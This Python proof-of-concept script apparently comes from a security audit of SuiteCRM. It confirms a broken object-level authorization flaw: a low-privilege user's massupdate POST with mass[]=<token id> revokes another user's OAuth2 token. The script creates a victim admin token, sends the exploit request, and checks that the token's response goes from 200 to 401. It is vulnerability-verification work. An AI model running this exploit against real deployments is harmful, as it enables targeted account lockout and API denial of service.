#!/usr/bin/env python3
"""
VULN-025 — `OAuth2Tokens massupdate` (mass[] branch) revokes/deletes ANY user's token by id
===========================================================================================

Sink  : targets/SuiteCRM/modules/OAuth2Tokens/controller.php:63-72  (the `mass` branch)
        foreach ($_REQUEST['mass'] as $id) {
            $token = BeanFactory::getBean('OAuth2Tokens', $id);   // by id, ANY owner
            ... $token->token_is_revoked = true; $token->save();  // no ACL / owner check
        }
Class : CWE-639 / CWE-862 BOLA (Broken Object-Level Authorization) -> API DoS / account lockout

*** MECHANISM CORRECTION (from dynamic testing) ***
The static finding claimed `select_entire_list=1 -> get_full_list()` revokes EVERY
user's tokens. That is FALSE here: `OAuth2Tokens::create_new_list_query`
(OAuth2Tokens.php:151-163) appends `AND assigned_user_id = <currentUserId>` for
NON-admins, so the select_entire_list branch is owner-scoped (a non-admin only
affects their own tokens). The REAL, confirmed vulnerability is the OTHER branch:
`mass[]=<token_id>` loads and revokes/deletes a token *by id with no ACL/owner
check*, so any authenticated user can revoke or delete another user's (incl.
admin's) OAuth token, given its id (obtainable via VULN-082's token leak or IDOR).

Exploitation idea
-----------------
1. (precondition) a victim OAuth token exists; the attacker learns its id.
2. Attacker (low-priv) POSTs `module=OAuth2Tokens&action=massupdate&mass[]=<victim_token_id>`.
3. The victim's token is revoked -> their API access breaks (denial of service).

What a successful run proves
----------------------------
A low-privilege user revokes another principal's OAuth2 access token by id; the
victim's previously-working V8 access token then returns 401 (revoked) -> targeted
API denial-of-service / account lockout across the OAuth boundary.
"""
import os
import sys
import hashlib

import jwt  # PyJWT, in the shared venv

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, ADMIN_USER, ADMIN_PASS, log, banner, rand, verdict,
                     admin_session, create_user, web_login, rest_login, rest_call, v8_token)

LOWPRIV_PASS = os.environ.get("LOWPRIV_PASS", "LowPriv@2026x!")


def main():
    banner("VULN-025", "OAuth2Tokens massupdate mass[] revokes ANY token by id (BOLA)")
    log("INFO", "sink: modules/OAuth2Tokens/controller.php:63-72 mass[] branch — getBean by id, no ACL/owner check")

    adm = admin_session()
    admin_sid = rest_login(ADMIN_USER, ADMIN_PASS)

    # --- attacker: a disposable low-priv user ----------------------------------
    attacker = create_user(adm, LOWPRIV_PASS)
    s = web_login(attacker["user_name"], attacker["password"])
    log("SETUP", f"attacker = low-priv user {attacker['user_name']} (is_admin=0)")

    # --- precondition: mint a VICTIM OAuth token (belongs to admin) -------------
    # OAuth2Clients.secret stores sha256(plaintext); mint via the password grant.
    plain = rand("secret")
    # Let SugarBean assign the GUID id (a non-GUID id is not resolvable by the OAuth client repo).
    res = rest_call("set_entry", [admin_sid, "OAuth2Clients", [
        {"name": "name", "value": rand("cli")},
        {"name": "secret", "value": hashlib.sha256(plain.encode()).hexdigest()},
        {"name": "allowed_grant_type", "value": "password"},
        {"name": "is_confidential", "value": "1"},
    ]])
    client_id = res.get("id")
    if not client_id:
        log("FAIL", f"could not create OAuth2 client: {res}")
        verdict("VULN-025", "FAILED", "precondition (oauth client) failed")
        sys.exit(1)
    log("SETUP", f"created OAuth2 password-grant client {client_id}")

    victim_token = v8_token(ADMIN_USER, ADMIN_PASS, client_id=client_id, client_secret=plain)
    if not victim_token:
        log("FAIL", "could not mint a victim access token (V8 keys/config?)")
        verdict("VULN-025", "FAILED", "precondition (victim token) failed")
        sys.exit(1)
    # The JWT jti is stored in oauth2tokens.access_token; the row's *id* is a separate GUID
    # (AccessTokenRepository::isAccessTokenRevoked looks the row up by access_token=jti).
    # The attacker learns this row id via VULN-082's OAuth-token leak / IDOR; we resolve it here.
    jti = jwt.decode(victim_token, options={"verify_signature": False}).get("jti")
    lookup = rest_call("get_entry_list", [admin_sid, "OAuth2Tokens",
                                          f"oauth2tokens.access_token = '{jti}'", "", 0,
                                          ["id", "assigned_user_id", "token_is_revoked"], [], 1, 0])
    el = lookup.get("entry_list") or []
    if not el:
        log("FAIL", f"could not resolve the victim token row id for jti={jti[:16]}...")
        verdict("VULN-025", "FAILED", "precondition (resolve token row id) failed")
        sys.exit(1)
    token_row_id = el[0]["id"]
    log("SETUP", f"minted VICTIM token (assigned to admin); oauth2tokens row id={token_row_id}")

    def v8_works(tok):
        r = s.get(f"{BASE_URL}/Api/V8/module/Accounts",
                  params={"page[size]": "1"},
                  headers={"Authorization": f"Bearer {tok}", "Accept": "application/vnd.api+json"},
                  timeout=30)
        return r.status_code

    before = v8_works(victim_token)
    log("PROOF", f"victim token works BEFORE attack: GET /Api/V8/module/Accounts -> HTTP {before} (expect 200)")

    # --- attack: low-priv attacker revokes the victim's token by id ------------
    log("STEP", "attacker POSTs massupdate mass[]=<victim token id> — by-id revoke, no ACL check")
    data = {"module": "OAuth2Tokens", "action": "massupdate", "mass[]": token_row_id,
            "return_module": "OAuth2Tokens", "return_action": "index", "current_query_by_page": "{}"}
    r = s.post(f"{BASE_URL}/index.php", data=data,
               headers={"Referer": f"{BASE_URL}/index.php?module=OAuth2Tokens&action=index"},
               allow_redirects=False, timeout=60)
    log("PROOF", f"attacker massupdate: HTTP {r.status_code}, csrf-blocked={'XSRF' in r.text}")

    after = v8_works(victim_token)
    log("PROOF", f"victim token works AFTER attack: HTTP {after} (expect 401 = revoked)")

    d = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(d, "request.http"), "w") as f:
        f.write("POST /index.php HTTP/1.1\r\nHost: localhost:33116\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Referer: http://localhost:33116/index.php?module=OAuth2Tokens&action=index\r\n"
                "Cookie: PHPSESSID=<attacker low-priv session>\r\n\r\n"
                f"module=OAuth2Tokens&action=massupdate&mass[]={token_row_id}"
                "&return_module=OAuth2Tokens&return_action=index&current_query_by_page=%7B%7D\r\n")
    with open(os.path.join(d, "response.txt"), "w") as f:
        f.write(f"victim V8 call BEFORE: HTTP {before}\nattacker massupdate: HTTP {r.status_code}\n"
                f"victim V8 call AFTER : HTTP {after}\n")

    if before == 200 and after == 401:
        log("OK", "exploit confirmed — a low-priv user revoked ANOTHER principal's (admin's) OAuth token by id; "
                  "the victim token went from working (200) to revoked (401)")
        verdict("VULN-025", "CONFIRMED",
                "low-priv mass[]=<id> revokes any user's OAuth token (BOLA -> API DoS)")
        sys.exit(0)
    log("FAIL", f"expected 200->401; got before={before} after={after}")
    verdict("VULN-025", "FAILED", "token revocation across owners not observed")
    sys.exit(1)


if __name__ == "__main__":
    main()
